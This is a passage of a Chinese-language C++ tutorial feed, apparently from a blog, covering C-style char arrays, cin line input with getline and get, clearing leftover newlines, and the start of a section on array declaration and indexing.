(&#x27;f&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\0&#x27;)</span></span><br><span class="line">                            <span class="comment">// dog 数组大小为 8，实际使用 7 个字符 + 1 个空字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> bird[] = <span class="string">&quot;wren&quot;</span>;   <span class="comment">// 编译器自动推断大小为 5 (&#x27;w&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;n&#x27;,&#x27;\0&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用列表初始化 (需要显式包含空字符)</span></span><br><span class="line">    <span class="keyword">char</span> fish[] = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误示例：数组大小不足</span></span><br><span class="line">    <span class="comment">// char cat[3] = &quot;cat&quot;; // 错误! 需要大小 4 来存储 &#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dog: &quot;</span> &lt;&lt; dog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// cout 遇到空字符停止输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bird: &quot;</span> &lt;&lt; bird &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fish: &quot;</span> &lt;&lt; fish &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问单个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Third letter of dog: &quot;</span> &lt;&lt; dog[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;t&#x27;</span></span><br><span class="line">    dog[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span>; <span class="comment">// 可以修改数组内容</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modified dog: &quot;</span> &lt;&lt; dog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;patcat&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// strlen() 函数计算字符串长度 (不包括空字符)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of dog: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">strlen</span>(dog) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6 (因为现在是 &quot;patcat&quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length of bird: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">strlen</span>(bird) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sizeof() 计算整个数组占用的内存大小 (包括空字符和未使用的空间)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of dog array: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(dog) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of bird array: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(bird) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong></p><ul><li>  存储 C 风格字符串的 <code>char</code> 数组大小必须至少是字符串长度加 1（为 <code>\0</code> 留出空间）。</li><li>  字符串字面值初始化会自动添加 <code>\0</code>。</li><li>  列表初始化需要手动添加 <code>\0</code>。</li><li>  <code>strlen()</code> 计算的是到 <code>\0</code> 为止的字符数。</li><li>  <code>sizeof()</code> 计算的是整个数组的字节大小。</li></ul><h2 id="4-2-3-字符串输入"><a href="#4-2-3-字符串输入" class="headerlink" title="4.2.3 字符串输入"></a>4.2.3 字符串输入</h2><p>使用 <code>cin</code> 和 <code>&gt;&gt;</code> 运算符读取 C 风格字符串（存储在 <code>char</code> 数组中）时，存在一个主要限制：<code>cin</code> 默认以<strong>空白字符</strong>（空格、制表符、换行符）作为输入的分隔符。这意味着 <code>cin &gt;&gt;</code> 只会读取到第一个空白字符之前的部分。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> name[SIZE];</span><br><span class="line">    <span class="keyword">char</span> dessert[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your first name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; name; <span class="comment">// 读取直到遇到第一个空白字符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your favorite dessert: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; dessert; <span class="comment">// 读取直到遇到第一个空白字符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I see you like &quot;</span> &lt;&lt; dessert &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行示例及问题:</strong></p><p>如果用户输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter your first name: Ada Lovelace</span><br><span class="line">Enter your favorite dessert: Chocolate Cake</span><br></pre></td></tr></table></figure><p>程序输出将会是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello, Ada!</span><br><span class="line">I see you like Lovelace. </span><br></pre></td></tr></table></figure><p><strong>原因:</strong></p><ol><li> <code>cin &gt;&gt; name;</code> 读取到 “Ada” 后遇到空格停止，”Ada” 被存入 <code>name</code> 数组（并自动添加 <code>\0</code>）。</li><li> “ Lovelace\nChocolate Cake\n” 仍然留在输入缓冲区中。</li><li> <code>cin &gt;&gt; dessert;</code> 从缓冲区开始读取，跳过开头的空格，读取到 “Lovelace” 后遇到换行符停止，”Lovelace” 被存入 <code>dessert</code> 数组。</li></ol><p>这显然不是我们期望的结果。<code>cin &gt;&gt;</code> 不适合读取包含空格的字符串。此外，如果用户输入的单词长度超过了数组的大小（减去 <code>\0</code> 的空间），还会导致**缓冲区溢出 (Buffer Overflow)**，这是严重的安全隐患。</p><h2 id="4-2-4-每次读取一行字符串输入"><a href="#4-2-4-每次读取一行字符串输入" class="headerlink" title="4.2.4 每次读取一行字符串输入"></a>4.2.4 每次读取一行字符串输入</h2><p>为了解决 <code>cin &gt;&gt;</code> 的问题，<code>iostream</code> 库提供了其他成员函数来读取整行输入，包括其中的空格，直到遇到换行符为止。常用的有两个：<code>getline()</code> 和 <code>get()</code>。</p><p><strong>1. <code>cin.getline(char* buffer, int size, char delimiter = &#39;\n&#39;)</code></strong></p><ul><li>  <code>buffer</code>: 用于存储输入的 <code>char</code> 数组。</li><li>  <code>size</code>: 缓冲区的大小。<code>getline()</code> 最多读取 <code>size - 1</code> 个字符，以确保有空间存放末尾的空字符 <code>\0</code>。</li><li>  <code>delimiter</code> (可选): 指定读取停止的分隔符，默认为换行符 <code>\n</code>。</li></ul><p><strong>行为:</strong></p><ul><li>  读取字符到 <code>buffer</code> 中，直到读取了 <code>size - 1</code> 个字符、遇到 <code>delimiter</code> 或到达文件末尾。</li><li>  如果遇到 <code>delimiter</code>，它会<strong>读取并丢弃</strong>该分隔符（通常是换行符）。</li><li>  总是在读取的字符序列末尾添加空字符 <code>\0</code>。</li></ul><p><strong>2. <code>cin.get(char* buffer, int size, char delimiter = &#39;\n&#39;)</code></strong></p><ul><li>  参数与 <code>getline()</code> 类似。</li></ul><p><strong>行为:</strong></p><ul><li>  读取字符到 <code>buffer</code> 中，直到读取了 <code>size - 1</code> 个字符、遇到 <code>delimiter</code> 或到达文件末尾。</li><li>  与 <code>getline()</code> 不同的是，如果遇到 <code>delimiter</code>，它<strong>不会读取</strong>该分隔符，而是将其<strong>留在输入缓冲区中</strong>。</li><li>  总是在读取的字符序列末尾添加空字符 <code>\0</code>。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">char</span> fullName[SIZE];</span><br><span class="line">    <span class="keyword">char</span> address[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 getline()</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(fullName, SIZE); <span class="comment">// 读取整行，包括空格，丢弃换行符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your address: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(address, SIZE); <span class="comment">// 读取下一行</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; fullName &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address: &quot;</span> &lt;&lt; address &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 get() - 注意换行符问题</span></span><br><span class="line">    <span class="keyword">char</span> title[SIZE];</span><br><span class="line">    <span class="keyword">char</span> author[SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter book title: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(title, SIZE); <span class="comment">// 读取整行，换行符留在缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果直接调用下一个 get()，它会立即读到上一个留下的换行符并停止</span></span><br><span class="line">    <span class="comment">// std::cin.get(author, SIZE); // 这将导致 author 为空</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要处理掉留下的换行符</span></span><br><span class="line">    <span class="comment">// 方法一：再调用一次 get() 读取单个字符</span></span><br><span class="line">    <span class="comment">// std::cin.get(); // 读取并丢弃换行符</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法二：使用 ignore() 跳过字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">100</span>, <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// 跳过最多100个字符，直到遇到换行符（并丢弃换行符）</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter author name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.get(author, SIZE); <span class="comment">// 现在可以正确读取作者名</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Title: &quot;</span> &lt;&lt; title &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Author: &quot;</span> &lt;&lt; author &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择 <code>getline()</code> 还是 <code>get()</code>?</strong></p><ul><li>  <code>getline()</code> 通常更方便，因为它会自动处理掉行尾的换行符，使得连续读取多行输入更简单。</li><li>  <code>get()</code> 提供了更精细的控制，因为它允许你检查下一个字符是否是换行符，但需要你手动处理留在缓冲区的分隔符。</li></ul><p><strong>空行和 <code>getline()</code>:</strong> 如果 <code>getline()</code> 遇到空行（即用户直接按 Enter），它会读取这个空行，将一个空字符串（只包含 <code>\0</code>）存入缓冲区，并丢弃换行符。</p><h2 id="4-2-5-混合输入字符串和数字"><a href="#4-2-5-混合输入字符串和数字" class="headerlink" title="4.2.5 混合输入字符串和数字"></a>4.2.5 混合输入字符串和数字</h2><p>当程序需要交替读取数字（使用 <code>cin &gt;&gt;</code>）和整行字符串（使用 <code>cin.getline()</code> 或 <code>cin.get()</code>）时，经常会遇到一个问题：<code>cin &gt;&gt;</code> 读取数字后，会将数字后面的<strong>换行符</strong>留在输入缓冲区中。</p><p>如果紧接着调用 <code>cin.getline()</code> 或 <code>cin.get()</code>，它们会立即读到这个残留的换行符，并认为已经到达行尾，导致读取失败或读到空字符串。</p><p><strong>问题示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; <span class="comment">// 读取年龄，换行符留在缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(name, <span class="number">50</span>); <span class="comment">// 立即读到残留的换行符，getline 结束，name 为空</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Name: []</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决方法:</strong></p><p>在读取数字后、调用 <code>getline()</code> 或 <code>get()</code> 读取整行之前，需要消耗掉输入缓冲区中残留的换行符。</p><ol><li><strong>使用 <code>cin.ignore()</code>:</strong> 这是常用的方法。<code>cin.ignore(n, delim)</code> 会跳过输入流中的字符，直到跳过了 <code>n</code> 个字符，或者遇到了 <code>delim</code> 分隔符（并丢弃该分隔符），以先到者为准。通常用于丢弃换行符： <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">100</span>, <span class="string">&#x27;\n&#x27;</span>); <span class="comment">// 跳过最多100个字符，直到并包括下一个换行符</span></span><br><span class="line"><span class="comment">// 或者更简单地，如果确定只有一个换行符需要丢弃</span></span><br><span class="line"><span class="comment">// std::cin.ignore(); // 跳过下一个字符 (即换行符)</span></span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>(cin &gt;&gt; ws)</code>:</strong> C++11 引入了 <code>std::ws</code> 输入流操纵符，它可以读取并丢弃输入流开头的所有空白字符（包括换行符）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; <span class="built_in">std</span>::ws).getline(name, <span class="number">50</span>); </span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>cin.get()</code> 读取单个字符:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span>.get(); <span class="comment">// 读取并丢弃换行符</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>修正后的示例 (使用 <code>cin.ignore()</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // 为了 numeric_limits (更健壮的 ignore)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除输入缓冲区，特别是换行符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>); </span><br><span class="line">    <span class="comment">// numeric_limits&lt;streamsize&gt;::max() 获取流能处理的最大字符数，确保清除整行</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.getline(name, <span class="number">50</span>); <span class="comment">// 现在可以正确读取姓名</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>修正后的示例 (使用 <code>ws</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ios&gt; // 为了 ws</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="comment">// 在 getline 之前使用 ws 跳过空白符</span></span><br><span class="line">    (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; <span class="built_in">std</span>::ws).getline(name, <span class="number">50</span>); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong> 混合输入数字和整行字符串时，务必记得在 <code>cin &gt;&gt; number;</code> 之后、调用 <code>getline()</code> 或 <code>get()</code> 之前，清除输入缓冲区中残留的换行符。使用 <code>cin.ignore()</code> 或 <code>(cin &gt;&gt; ws)</code> 是推荐的做法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.1 数组</title>
      <link href="2025/04/26/4.1_%E6%95%B0%E7%BB%84/"/>
      <url>2025/04/26/4.1_%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p><strong>数组 (Array)</strong> 是一种<strong>复合类型 (Compound Type)**，它允许你存储多个</strong>相同类型<strong>的值。数组中的每个值称为一个</strong>元素 (Element)<strong>，可以通过</strong>索引 (Index)** 或<strong>下标 (Subscript)</strong> 来访问特定元素。</p><h2 id="4-1-1-程序说明"><a href="#4-1-1-程序说明" class="headerlink" title="4.1.1 程序说明"></a>4.1.1 程序说明</h2><p>想象一下，你需要存储一年中每个月的销售额。你可以声明12个独立的 <code>double</code> 变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> salesJan, salesFeb, salesMar, <span class="comment">/* ..., */</span> salesDec; </span><br></pre></td></tr></table></figure><p>这种方法非常繁琐，尤其是在需要处理大量数据时。数组提供了一种更简洁、更强大的方式来处理这种情况。</p><p><strong>数组声明:</strong></p><p>声明一个数组需要指定：</p><ol><li> <strong>元素类型:</strong> 数组中存储的数据类型。</li><li> <strong>数组名称:</strong> 变量名。</li><li> <strong>数组大小:</strong> 数组可以容纳的元素数量，必须是一个<strong>常量表达式</strong>（在编译时就能确定其值的表达式，例如字面常量、<code>const</code> 常量、枚举量或 <code>sizeof</code> 表达式的结果），并且必须放在方括号 <code>[]</code> 内。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[arraySize]; </span><br></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明一个可以存储 12 个 double 类型值的数组，名为 monthlySales</span></span><br><span class="line"><span class="keyword">double</span> monthlySales[<span class="number">12</span>]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个可以存储 5 个 int 类型值的数组，名为 scores</span></span><br><span class="line"><span class="keyword">int</span> scores[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 const 常量定义数组大小</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> NUM_STUDENTS = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">int</span> studentGrades[NUM_STUDENTS]; </span><br></pre></td></tr></table></figure><p><strong>访问数组元素:</strong></p><p>使用数组名和方括号内的索引来访问数组元素。<strong>C++数组的索引从 0 开始</strong>。对于大小为 <code>N</code> 的数组，有效的索引范围是 <code>0</code> 到 <code>N-1</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 